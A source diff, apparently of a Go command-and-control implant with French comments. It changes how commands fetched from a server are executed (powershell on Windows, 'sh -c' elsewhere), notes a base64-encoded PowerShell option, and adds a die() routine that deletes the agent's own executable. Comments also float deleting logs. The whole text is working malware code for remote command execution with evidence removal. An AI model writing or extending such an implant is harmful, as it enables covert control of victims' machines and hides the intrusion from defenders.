@@ -6,6 +6,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"os"
 	"os/exec"
 	"runtime"
 )
@@ -92,7 +93,8 @@ func GetCommand(agentId string) {
 	var cmd *exec.Cmd
 
 	if clientOs == "windows" {
-		cmd = exec.Command("cmd.exe", "/C", result.Command)
+		// cmd = exec.Command("powershell", "-EncodedCommand", base64Encode(command)) - Oist encodage B64
+		cmd = exec.Command("powershell", "-H", result.Command)
 	} else {
 		cmd = exec.Command("sh", "-c", result.Command)
 	}
@@ -160,6 +162,10 @@ func sendResult(agentId string, output string, taskId string) bool {
 }
 
 func die() {
-	// Destruction call - Suppression éléments
-
+	// Destruction call - Suppression éléments - Créer un trigger command
+	// Suppression logs ? Suppression des éléments?
+	var execPath string
+	execPath, _ = os.Executable()
+	os.Remove(execPath)
+	os.Exit(0)
 }
